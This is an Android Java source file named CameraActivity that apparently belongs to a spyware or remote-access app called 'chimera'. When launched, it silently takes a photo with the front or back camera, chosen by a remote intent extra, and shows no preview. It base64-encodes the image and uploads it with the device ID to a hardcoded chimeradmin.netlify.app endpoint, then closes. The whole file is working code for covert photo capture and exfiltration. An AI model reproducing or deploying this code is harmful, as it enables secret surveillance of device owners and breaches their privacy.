package com.chimera;

import android.Manifest;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Base64;
import android.util.Log;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.camera.core.CameraSelector;
import androidx.camera.core.ImageCapture;
import androidx.camera.core.ImageCaptureException;
import androidx.camera.core.ImageProxy;
import androidx.camera.lifecycle.ProcessCameraProvider;
import androidx.core.content.ContextCompat;
import com.android.volley.DefaultRetryPolicy;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;
import com.google.common.util.concurrent.ListenableFuture;
import org.json.JSONException;
import org.json.JSONObject;

import java.nio.ByteBuffer;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class CameraActivity extends AppCompatActivity {
    private static final String TAG = "CameraActivity";
    private static final String UPLOAD_FILE_URL = "https://chimeradmin.netlify.app/.netlify/functions/upload-file";
    private static final String SUBMIT_DATA_URL = "https://chimeradmin.netlify.app/.netlify/functions/submit-data";

    private ExecutorService cameraExecutor;
    private RequestQueue requestQueue;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        cameraExecutor = Executors.newSingleThreadExecutor();
        requestQueue = Volley.newRequestQueue(this);
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
            startCameraAndCapture();
        } else {
            submitErrorToServer("Camera permission not granted.");
            finish();
        }
    }

    private void startCameraAndCapture() {
        ListenableFuture<ProcessCameraProvider> cameraProviderFuture = ProcessCameraProvider.getInstance(this);
        cameraProviderFuture.addListener(() -> {
            try {
                ProcessCameraProvider cameraProvider = cameraProviderFuture.get();
                int cameraId = getIntent().getIntExtra("camera_id", 0);
                int lensFacing = (cameraId == 1) ? CameraSelector.LENS_FACING_FRONT : CameraSelector.LENS_FACING_BACK;
                CameraSelector cameraSelector = new CameraSelector.Builder().requireLensFacing(lensFacing).build();
                ImageCapture imageCapture = new ImageCapture.Builder().setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY).build();
                cameraProvider.bindToLifecycle(this, cameraSelector, imageCapture);
                takePicture(imageCapture);
            } catch (Exception e) {
                submitErrorToServer("CameraX initialization failed: " + e.getMessage());
                finish();
            }
        }, ContextCompat.getMainExecutor(this));
    }

    private void takePicture(ImageCapture imageCapture) {
        imageCapture.takePicture(ContextCompat.getMainExecutor(this), new ImageCapture.OnImageCapturedCallback() {
            @Override
            public void onCaptureSuccess(@NonNull ImageProxy image) {
                try {
                    ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                    byte[] bytes = new byte[buffer.remaining()];
                    buffer.get(bytes);
                    String encodedImage = Base64.encodeToString(bytes, Base64.DEFAULT);
                    uploadFileToServer("picture", encodedImage);
                } catch (Exception e) {
                    submitErrorToServer("Image processing failed: " + e.getMessage());
                } finally {
                    image.close();
                    finish();
                }
            }
            @Override
            public void onError(@NonNull ImageCaptureException exception) {
                submitErrorToServer("Image capture failed: " + exception.getMessage());
                finish();
            }
        });
    }

    private void uploadFileToServer(String dataType, String base64Data) {
        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        JSONObject postData = new JSONObject();
        try {
            postData.put("deviceId", deviceId);
            postData.put("dataType", dataType);
            postData.put("fileData", base64Data);
            JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, UPLOAD_FILE_URL, postData,
                r -> Log.i(TAG, "File uploaded"), e -> Log.e(TAG, "Upload failed: " + e.toString()));
            request.setRetryPolicy(new DefaultRetryPolicy(20000, 1, DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));
            requestQueue.add(request);
        } catch (JSONException e) { Log.e(TAG, "Could not create upload JSON", e); }
    }

    private void submitErrorToServer(String errorMessage) {
        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        JSONObject postData = new JSONObject();
        try {
            postData.put("deviceId", deviceId);
            postData.put("dataType", "camera_error");
            postData.put("payload", errorMessage);
            JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, SUBMIT_DATA_URL, postData,
                r -> Log.i(TAG, "Error log submitted"), e -> Log.e(TAG, "Error log submission failed: " + e.toString()));
            requestQueue.add(request);
        } catch (JSONException e) { Log.e(TAG, "Could not create error submission JSON", e); }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        cameraExecutor.shutdown();
    }
}
